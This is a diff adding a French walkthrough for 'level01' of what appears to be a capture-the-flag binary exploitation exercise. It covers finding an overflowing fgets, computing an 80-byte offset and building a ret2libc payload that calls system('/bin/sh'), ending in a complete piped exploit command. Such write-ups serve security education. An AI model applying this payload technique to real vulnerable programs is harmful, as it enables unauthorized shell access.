@@ -1,5 +1,51 @@
 <!-- vim: syntax=Markdown -->
 
+Pour ce niveau, on a un programme qui nous demande un nom d'utilisateur et un mot de passe.
+
+En décompilant le code, on peut voir les mots de passe en clair : `dat_wil` et `admin`.
+
+Mais cela ne mène à rien. Le programme se termine, et on constate même que la condition du mot de passe est toujours valide.
+
+On remarque également une fonction vulnérable : le second `fgets` (celui du mot de passe), qui dans le cas de ce code, récupère plus d'octets que la taille du buffer.
+
+Nous avons passé beaucoup de temps à essayer de faire un shellcode qui s'éxécute lui-même, pour lancer un syscall `execve`,\
+mais nous n'avons réussi à l'utiliser que sur `gdb`, il y avait des segfault sans.
+
+Au final, nous sommes passés par un `ret2libc`, dont le principe n'est pas d'éxécuter du code sur la stack, mais de changer\
+le pointeur de retour vers une fonction existante de la libc, tel que `system`, avec comme paramètre une string, elle aussi\
+présente dans le programme, ou placée dans la stack.\
+Il est intéressant d'utiliser `/bin/sh`, car cette chaîne est déjà présente dans le programme.
+
+Pour trouver les adresse des fonctions à utiliser, on va utiliser cette commande `gdb` :
+```gdb
+(gdb) p {fonction}
+```
+
+Et pour trouver une chaîne de caractère :
+```gdb
+(gdb) find __libc_start_main,+99999999,"{string}"
+```
+
+Il faut en suite calculer l'offset auquel placer notre première adresse.\
+On peut le calculer assez facilement :
+```asm
+// [...]
+   0x080484d0 <+0>:     push   ebp                  // push -> esp += 4
+// [...]
+   0x080484d3 <+3>:     push   edi                  // push -> esp += 4
+   0x080484d4 <+4>:     push   ebx                  // push -> esp += 4
+   0x080484d5 <+5>:     and    esp,0xfffffff0       // aligne la stack, donc il y aura un décalage entre 0 et 15 octets possibles
+   0x080484d8 <+8>:     sub    esp,0x60             // augmente le pointeur de la stack de 96 octets
+   0x080484db <+11>:    lea    ebx,[esp+0x1c]       // cette adresse, esp+0x1c est utilisée pour le buffer de `fgets` (1c = 28 octets)
+// [...]
+```
+
+Calculons l'index de l'adresse de retour :\
+`96 + 4 + 4 + 4 + (0-16 ?) - 28 = 80 + (0-16 ?)`.\
+Pour le `0-16`, on peut observer `esp` avant et après via `gdb`, et on voit que on est déjà aligné, donc 0.
+Donc `80 + 0 = 80`.
+On peut donc remplir notre buffer de 80 `nop` (ou de ce qu'on veut vu qu'on ne va pas éxécuter la stack).
+
 Voici le détail du shellcode utilisé :
 ```shellcode
 \x90\x90\x90\x90 ┐ nop
@@ -26,3 +72,8 @@ Voici le détail du shellcode utilisé :
 \x70\xeb\xe5\xf7 ╴ exit function
 \xec\x97\xf8\xf7 ╴ /bin/sh
 ```
+
+Il ne reste plus qu'à ouvrir un reverse-shell "local", en maintenant un `cat` ouvert.\
+On met un `printf` au début de la commande pour envoyer notre shellcode précédé par le nom d'utilisateur et une nouvelle ligne, puis on ouvre un cat.\
+Il ne reste plus qu'à envoyer ça via un pipe dans l'éxécutable.
+`(printf 'dat_wil\n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7'; cat) | ./level01`
